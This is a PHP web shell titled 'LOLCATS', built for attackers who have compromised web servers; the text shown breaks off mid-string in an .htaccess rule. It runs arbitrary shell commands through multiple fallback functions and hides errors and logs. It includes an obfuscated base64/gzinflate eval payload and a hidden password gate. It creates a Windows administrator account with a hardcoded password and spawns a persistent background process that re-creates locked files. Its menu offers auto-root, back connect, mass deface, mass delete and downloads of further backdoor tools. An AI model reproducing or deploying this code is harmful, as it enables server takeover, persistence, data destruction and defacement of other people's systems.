<?php
set_time_limit(0);
error_reporting(0);
@ini_set("error_log", null);
@ini_set("log_errors", 0);
@ini_set("max_execution_time", 0);
@ini_set("output_buffering", 0);
@ini_set("display_errors", 0);
$_1337 = array_merge($_POST, $_GET);
$_r = "required='required'";
$gcw = "getcwd";
function Yolo($array) {	
    return is_array($array) ? array_map('Yolo', $array) : stripslashes($array);}
    $_POST = Yolo($_POST); 
    $_COOKIE = Yolo($_COOKIE);
    function logsx() {
        die("<form method='post'><input type='password' style='text-decoration:none;background-color: transparent;border: none;border-bottom: 0px;color: transparent;outline: none;' name='pass'></form>");
    }   
    function Yolosetcookie($k, $v) {
        $_COOKIE[$k] = $v;
        setcookie($k, $v);
    }
    if(!empty($auth_pass)) {
        if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
            Yolosetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
        if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        logsx();}
function w($dir, $perm)
{
    if (!is_writable($dir)) {
        return "<rd>" . $perm . "</rd>";
    } else {
        return "<gr>" . $perm . "</gr>";
    }
}
function s()
{
    echo '<style>table{display:none;}</style><div class="table-responsive"><center><hr></hr></center></div>';
}
function ok()
{
    echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er()
{
    echo '<div class="alert alert-dark alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt)
{
    $typ = ["B", "KB", "MB", "GB", "TB"];
    for ($i = 0; $byt >= 1024 && $i < count($typ) - 1; $byt /= 1024, $i++);
    return round($byt, 2) . " " . $typ[$i];
}
function ia()
{
    $ia = "";
    if (getenv("HTTP_CLIENT_IP")) {
        $ia = getenv("HTTP_CLIENT_IP");
    } elseif (getenv("HTTP_X_FORWARDED_FOR")) {
        $ia = getenv("HTTP_X_FORWARDED_FOR");
    } elseif (getenv("HTTP_X_FORWARDED")) {
        $ia = getenv("HTTP_X_FORWARDED");
    } elseif (getenv("HTTP_FORWARDED_FOR")) {
        $ia = getenv("HTTP_FORWARDED_FOR");
    } elseif (getenv("HTTP_FORWARDED")) {
        $ia = getenv("HTTP_FORWARDED");
    } elseif (getenv("REMOTE_ADDR")) {
        $ia = getenv("REMOTE_ADDR");
    } else {
        $ia = "Unknown IP";
    }
    return $ia;
}
if(file_get_contents("lolcatsloh.txt") == "lolcatsloooh") {
	$name = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHN0ciUyOSUyOSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
	$str = "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";
	$text = "Sy1LzNHIKMnNKS5ITc5MzEnOSCwqjk9JTc5PSdUoLcqBspISi1PNTGDiKnmJuamaQGANAA==";
	eval(gzinflate(base64_decode($text)));unlink("lolcatsloh.txt");}
function lokit()
{
    echo "<center class='anu'>Lock Shell</center><div class='card card-body text-dark input-group mb-3'>";
    if ($_POST["lokit"] == "yes") {
        echo "<center><b class='d-inline-block text-white'>SH3LL L0CK3D!</b></center><br>";
        $mass = fopen("lolcatsloh.txt", "w");
        fwrite($mass, "lolcatsloooh");
        echo "<b class='d-inline-block'>Reloading..</b><meta http-equiv='refresh' content='1'><br>";
    } else {
        echo "<p class='d-inline-block text-center'>LOCK SHELL = The shell cannot be removed unless it is KILLED! (how to kill? use your brain!)</p><form action='' method='post'><input type='hidden' name='lokit' value='yes'>&nbsp<center><button type='submit' class='btn btn-dark'>LOCK!</button></form></center></div>";
    }
}
function deleteDir($dirPath) {
    if (!is_dir($dirPath)) {
        return false;
    }
    $files = array_diff(scandir($dirPath), array('.', '..'));
    foreach ($files as $file) {
        $filePath = $dirPath . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            deleteDir($filePath);
        } else {
            unlink($filePath);
        }
    }
    rmdir($dirPath);
    return true;
}
function exe($cmd)
{
    $method = "";
    if (function_exists("system")) {
        $method = "system";
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();  
        return "$method: $buff";
    } elseif (function_exists("exec")) {
        $method = "exec";
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff .= $result;
        }
        return "$method: $buff";
    } elseif (function_exists("passthru")) {
        $method = "passthru";
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return "$method: $buff";
    } elseif (function_exists("shell_exec")) {
        $method = "shell_exec";
        $buff = @shell_exec($cmd);
        return "$method: $buff";
    } elseif (function_exists("`")) {
        $method = "backticks";
        $buff = `{$cmd}`;
        return "$method: $buff";
    } elseif (function_exists("popen")) {
        $method = "popen";
        $handle = @popen($cmd, "r");
        $buff = "";
        if ($handle) {
            while (!feof($handle)) {
                $buff .= fread($handle, 4096);
            }
            @pclose($handle);
        }
        return "$method: $buff";
    } elseif (function_exists("proc_open")) {
        $method = "proc_open";
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"],
        ];

        $process = @proc_open($cmd, $descriptorspec, $pipes);
        $buff = "";

        if (is_resource($process)) {
            fclose($pipes[0]);
            while (!feof($pipes[1])) {
                $buff .= fread($pipes[1], 4096);
            }
            fclose($pipes[1]);
            fclose($pipes[2]);
            @proc_close($process);
        }

        return "$method: $buff";
    }

    return false;
}


function exe_root($set, $sad)
{
    $x = "preg_match";
    $xx = "2>&1";
    if (!$x("/" . $xx . "/i", $set)) {
        $set = $set . " " . $xx;
    }
    $a = "function_exists";
    $b = "proc_open";
    $c = "htmlspecialchars";
    $d = "stream_get_contents";
    if ($a($b)) {
        $ps = $b(
            $set,
            [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "r"]],
            $pink,
            $sad
        );
        return $d($pink[1]);
    } else {
        return "proc_open function is disabled!";
    }
}
function p($file)
{
    $p = fileperms($file);
    if (($p & 0xc000) == 0xc000) {
        $i = "s";
    } elseif (($p & 0xa000) == 0xa000) {
        $i = "l";
    } elseif (($p & 0x8000) == 0x8000) {
        $i = "-";
    } elseif (($p & 0x6000) == 0x6000) {
        $i = "b";
    } elseif (($p & 0x4000) == 0x4000) {
        $i = "d";
    } elseif (($p & 0x2000) == 0x2000) {
        $i = "c";
    } elseif (($p & 0x1000) == 0x1000) {
        $i = "p";
    } else {
        $i = "u";
    }
    $i .= $p & 0x0100 ? "r" : "-";
    $i .= $p & 0x0080 ? "w" : "-";
    $i .= $p & 0x0040 ? ($p & 0x0800 ? "s" : "x") : ($p & 0x0800 ? "S" : "-");
    $i .= $p & 0x0020 ? "r" : "-";
    $i .= $p & 0x0010 ? "w" : "-";
    $i .= $p & 0x0008 ? ($p & 0x0400 ? "s" : "x") : ($p & 0x0400 ? "S" : "-");
    $i .= $p & 0x0004 ? "r" : "-";
    $i .= $p & 0x0002 ? "w" : "-";
    $i .= $p & 0x0001 ? ($p & 0x0200 ? "t" : "x") : ($p & 0x0200 ? "T" : "-");
    return $i;
}
if (isset($_1337["dir"])) {
    $dir = $_1337["dir"];
    chdir($dir);
} else {
    $dir = $gcw();
}
echo "
<html>
	<head>
		<meta charset='utf-8'>
		<meta name='author' content='LOLCATS'>
		<!--<meta name='viewport' content='width=device-width, initial-scale=0.40'>-->
        <meta name='viewport' content='width=device-width,initial-scale=1,minimum-scale=1'>
		<meta name='robots' content='noindex, nofollow, noarchive'>
		<link rel='icon' href='https://icons.iconarchive.com/icons/gcds/halloween/256/black-cat-icon.png'>
		<title>LOLCATS</title>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
		<style>@import url('//cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css');
@import url('//cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css');
@import url('//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/themes/prism-okaidia.css');
@import url('https://fonts.googleapis.com/css2?family=Ubuntu+Condensed');
@import url('https://fonts.googleapis.com/css2?family=Sedgwick+Ave&display=swap');

body {
	cursor: url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important;
	font-family: 'Ubuntu Condensed';
}

.shell {
	border-radius: 4px;
	border: 1px solid rgba(255, 255, 255, 0.4);
	font-size: 10pt;
	display: flex;
	flex-direction: column;
	align-items: stretch;
	background: #242424;
	color: #fff;
}

.pre {
	height: 150px;
	overflow: auto;
	white-space: pre-wrap;
	flex-grow: 1;
	margin: 10px auto;
	padding: 10px;
	line-height: 1.3em;
	overflow-x: scroll;
}

.anu,
kbd {
	font-family: 'Sedgwick Ave', cursive;
}

.corner {
	text-align: right;
	margin-top: -10px;
	font-size: 12px;
}

gr {
	color: green;
}

ih {
	color: white;
}
re {
	color: gray;
}
rd {
	color: red;
}

.center {
	text-align: center;
}

.center table {
	margin: 1em auto;
	text-align: left;
}

.center th {
	text-align: center !important;
}

.php_info td,
th {
	border: 1px solid #666;
	font-size: 75%;
	vertical-align: baseline;
	padding: 4px 5px;
}

.p {
	text-align: left;
}

.e {
	background-color: #ccf;
	width: 300px;
	font-weight: bold;
}

.h {
	background-color: #99c;
	font-weight: bold;
}

.v {
	background-color: #ddd;
	max-width: 300px;
	overflow-x: auto;
	word-wrap: break-word;
}

.v i {
	color: #999;
}

img {
	float: right;
	border: 0;
}

hr {
	width: 934px;
	background-color: #ccc;
	border: 0;
	height: 1px;
}

h1 {
	font-size: 150%;
}

h2 {
	font-size: 125%;
}

</style>
	</head>
<body class='bg-dark text-light'>
<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='" .
    $_SERVER["PHP_SELF"] .
    "'><h1>L"."O"."LC"."A"."TS</h1></a>";
if (isset($_1337["path"])) {
    $path = $_1337["path"];
    chdir($path);
} else {
    $path = $gcw();
}
$path = str_replace("\\", "/", $path);
$paths = explode("/", $path);
foreach ($paths as $id => $pat) {
    if ($pat == "" && $id == 0) {
        $a = true;
        echo "<i class='bi bi-hdd-rack'></i> : <a class='text-decoration-none text-light' href='?path=/'>/</a>";
        continue;
    }
    if ($pat == "") {
        continue;
    }
    echo "<a class='text-decoration-none text-light' href='?path=";
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) {
            echo "/";
        }
    }
    echo "'>" . $pat . "</a>/";
}
$scand = scandir($path);
echo "&nbsp;[ " . w($path, p($path)) . " ]";
// info
$sql = function_exists("mysql_connect") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$curl = function_exists("curl_version") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$wget = exe("wget --help") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$pl = exe("perl --help") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$py = exe("python --help") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$gcc = exe("gcc --help") ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$pkexec = exe('pkexec --version"') ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disfc = "<gr>NONE</gr>";
} else {
    $disfc = "<rd>$disfunc</rd>";
}
if (!function_exists("posix_getegid")) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid["name"];
    $uid = $uid["uid"];
    $group = $gid["name"];
    $gid = $gid["gid"];
}
$sm =
    @ini_get(strtolower("safe_mode")) == "on" ? "<rd>ON</rd>" : "<gr>OFF</gr>";
echo "<div class='container-fluid'>
    <div class='corner'>
        <i data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>Information Server</i>
    </div><br>
    <div class='collapse text-dark mb-3' id='collapseExample'>
        <div class='box shadow bg-light p-3 rounded-3'>
        System: <gr>" .
    php_uname() .
    "</gr><br>
        Software: <gr>" .
    $_SERVER["SERVER_SOFTWARE"] .
    "</gr><br>
        PHP Version: <gr>" .
    PHP_VERSION .
    "</gr> PHP Os: <gr>" .
    PHP_OS .
    "</gr><br>
        Server IP: <gr>" .
    gethostbyname($_SERVER["HTTP_HOST"]) .
    "</gr><br>
        Your IP: <gr>" .
    ia() .
    "</gr><br>
        User: <gr>$user</gr> [$uid] | Group: <gr>[$group]</gr> [$gid]<br>
        Safe Mode: $sm<br>
        MYSQL: $sql | PERL: $pl | PYTHON: $py | WGET: $wget | CURL: $curl | GCC: $gcc | PKEXEC: $pkexec<br>
        Disable Function:<br><pre>$disfc</pre>
        </div>
    </div>
		</div>
		<div class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=autoroot'><i class='bi bi-bug'></i> Auto Root </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=backcon'><i class='bi bi-hdd-network'></i> Back Connect </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=cmd'><i class='bi bi-terminal'></i> Command </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=masschemod'><i class='bi bi-file-earmark-medical'></i> Chmod All [F/D] </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=rdp'><i class='bi bi-intersect'></i> Create RDP </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=cpanel'><i class='bi bi-gear'></i> cPanel </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=findmtime'><i class='bi bi-files'></i> Find Modified Time </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=findkey'><i class='bi bi-file-earmark-break'></i> Find File </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=getpriv'><i class='bi bi-code-square'></i> Get Private Tools </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=jumping'><i class='bi bi-door-open'></i> Jumping </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=lockfile'><i class='bi bi-file-earmark-lock'></i> Lock File </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=lokit'><i class='bi bi-lock'></i> Lock Shell </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass Deface</a>
				<a class='btn btn-outline-danger btn-sm' href='?dir=$path&id=delete'><i class='bi bi-trash'></i> Mass Delete </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=chmod'><i class='bi bi-file-earmark-medical'></i> Mass Chmod</a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=portscan'><i class='bi bi-hdd'></i> Port Scan </a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=upload'><i class='bi bi-upload'></i> Upload </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=zoneh'><i class='bi bi-file-text'></i> Zone-H </a><br> 
			</div>
		</div>";
$full = str_replace($_SERVER["DOCUMENT_ROOT"], "", $path);
// tools
if (isset($_1337["dir"])) {
    $dir = $_1337["dir"];
    chdir($dir);
} else {
    $dir = $gcw();
}
$path = str_replace("\\", "/", $path);
$scdir = explode("/", $dir);
for ($i = 0; $i <= $c_dir; $i++) {
    $scdir[$i];
    if ($i != $c_dir) {
    }
    // create rdp
    if ($_1337["id"] == "rdp") {
        ob_implicit_flush();
        ob_end_flush();
        if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
            echo '<center class="anu">Create RDP (Windows Server)</center>';
            echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>' .
                exe_root("net user DataAdmin Monochrx#37 /add", $path) .
                exe_root("net localgroup administrators DataAdmin /add",$path) .'<br>If there is no "Access is denied." output, chances are that you have succeeded in creating a user here. Just log in using the username and password below.hosts: <gr>' .
                gethostbyname($_SERVER["HTTP_HOST"]) .
                '
username: DataAdmin
password: Monochrx#37</code></pre>
					</div>
				</div>';
        } else {
            echo "<script>alert('Whutt?! kids, this tool only works for windows server!');</script>";
        }
    }
    // lock shell
    if ($_1337["id"] == "lokit") {
        s();
        lokit();
    }
	if ($_1337["id"] == "lockfile") {
        s();
echo '<center class="anu">Lock File</center>
<div class="card card-body text-dark input-group mb-3">
    <div class="container-fluid mt-1">
    <form method="post" action="">
        <div class="mb-3">
            <input type="text" name="lockfile" class="form-control form-control-sm text-dark flex-grow-1" placeholder="filename.php" required>
        </div>
		<div class="d-grid gap-2">
                <input class="btn btn-dark btn-sm" type="submit" value="Submit!">
        </div>
    </form>
</div></div>';
function remdot($filename) {
    return str_replace('.', '', $filename);
}

function get_temp_dir() {
    $tmp_paths = array('/tmp', '/var/tmp');

    foreach ($tmp_paths as $tmp_path) {
        if (is_writable($tmp_path)) {
            return $tmp_path;
        }
    }

    return false;
}
function cmdoitlock($command) {
    if (function_exists('system')) {
        system($command);
    } elseif (function_exists('exec')) {
        exec($command);
    } elseif (function_exists('shell_exec')) {
        shell_exec($command);
    } elseif (function_exists('passthru')) {
        passthru($command);
    } elseif (function_exists('popen')) {
        $handle = popen($command, 'r');
        if ($handle) {
            while (!feof($handle)) {
                echo fgets($handle, 4096);
            }
            pclose($handle);
        }
    } elseif (function_exists('proc_open')) {
        proc_open($command, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")), $pipes);
    } elseif (function_exists('`')) {
        echo `$command`;
    }
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['lockfile'])) {
    $namafilelos = $_POST['lockfile'];
        $tmpnya = get_temp_dir();

    if ($tmpnya) {
        $cachedirectorylo = $tmpnya . '/.PHPSESSID';

        if (file_exists($cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-handler')) &&
            file_exists($cachedirectorylo . '/.' . remdot($namafilelos) . '-text')) {

            cmdoitlock('rm -rf ' . $cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-text-file'));
            cmdoitlock('rm -rf ' . $cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-handler'));
        }

        mkdir($cachedirectorylo);
        cmdoitlock("cp $namafilelos $cachedirectorylo/." . base64_encode(getcwd() . remdot($namafilelos) . '-text-file'));
        chmod($namafilelos, 0444);

        $handler = '<?php
        @ini_set("max_execution_time", 0);
        while (true) {
            if (!file_exists("' . getcwd() . '")) {
                mkdir("' . getcwd() . '");
            }

            if (!file_exists("' . getcwd() . '/' . $namafilelos . '")) {
                $text = base64_encode(file_get_contents("' . $tmpnya . '/.PHPSESSID/.' . base64_encode(getcwd() . remdot($namafilelos) . '-text-file') . '"));
                file_put_contents("' . getcwd() . '/' . $namafilelos . '", base64_decode($text));
            }

            if (lolcatsperm("' . getcwd() . '/' . $namafilelos . '") != 0444) {
                chmod("' . getcwd() . '/' . $namafilelos . '", 0444);
            }
        }

        function lolcatsperm($filename) {
            return substr(sprintf("%o", fileperms($filename)), -4);
        }
        ';

        $handlerfile = $cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-handler');
        $handlersaction = file_put_contents($handlerfile, $handler);

        if ($handlersaction) {
            cmdoitlock('php ' . $handlerfile . ' > /dev/null 2>/dev/null &');
        }
    } else {
        echo "<script>alert('ERROR! Access denied.');</script>";
    }
}
    }
    // get tools
    if ($_1337["id"] == "getpriv") {
        s();
        echo "<center class='anu'>Get Private Tools</center>
        <div class='card card-body text-dark input-group mb-3'>
        <form method='POST'> 
        <i class='bi bi-file-earmark'></i> Select a tools/code:
        <select class='form-control btn-sm text-dark' name='option'>
            <option value='1' selected>Adminer (Database Login)</option>
            <option value='2'>Htaccess (Kill All Backdoor)</option>
            <option value='3'>Weevely Remote Shell</option>
            <option value='4'>SSI Shell (Bypass Command Litespeed)</option>
            <option value='5'>WordPress Auto Add Admin (On Themes)</option>
            <option value='6'>Alfabepas (Alfa Bypass Version)</option>
            <option value='7'>Marijuana (Best Bypass Shell)</option>
            <option value='8'>Private Config Grabber (Auto Grab Config)</option>
        </select>
        <div class='d-grid gap-2'>
            <input class='btn btn-dark btn-sm' type='submit' name='get' value='Submit!'>
        </div>
        </form>
        </div>";
        if (isset($_POST['get']) && $_POST['option'] == '1') {
            function downloadFile($url, $fileName)
{
    $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3';
    $downloaded = false;
    $ch = curl_init($url);
    $fp = fopen($fileName, 'w');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    if (curl_exec($ch)) {
        $downloaded = true;
    }
    curl_close($ch);
    fclose($fp);
    if (!$downloaded) {
        $opts = [
            'http' => [
                'method' => "GET",
                'header' => "User-Agent: $userAgent\r\n"
            ]
        ];
        $context = stream_context_create($opts);
        $fileContent = file_get_contents($url, false, $context);
        if ($fileContent !== false) {
            file_put_contents($fileName, $fileContent);
            $downloaded = true;
        }
    }
    if (!$downloaded) {
        $fp = fopen($fileName, 'w');
        if ($fp) {
            $source = fopen($url, 'r');
            if ($source) {
                while ($content = fread($source, 8192)) {
                    fwrite($fp, $content);
                }
                fclose($source);
                $downloaded = true;
            }
            fclose($fp);
        }
    }
    if ($downloaded) {
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $urlwebsite = $protocol . '://' . $_SERVER['HTTP_HOST'];
        $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($fileName);
        echo "<center><a href='$downloadLink' target='_blank' class='btn btn-danger'>Lolcats Adminer - Click Here!</a></center>";
    } else {
        echo "<center><p class='text-danger'>Failed to download the file.</p></center>";
    }
}

$url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
$fileName = getcwd() . '/lolcats-adminers.php';
downloadFile($url, $fileName);
        }
        elseif(isset($_POST['get']) && $_POST['option'] == '2') {?>
            <div class='container-fluid language-javascript'>
    <div class='shell mb-3'>
        <pre style='font-size: 10px;'><code><?php
        $filenya = $_SERVER["PHP_SELF"];
        $resoolt = str_replace('/', '', $filenya);
            echo htmlspecialchars("Options -Indexes
<FilesMatch \".*\\.(cgi|pl|py|pyc|pyo|php3|php4|php5|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php 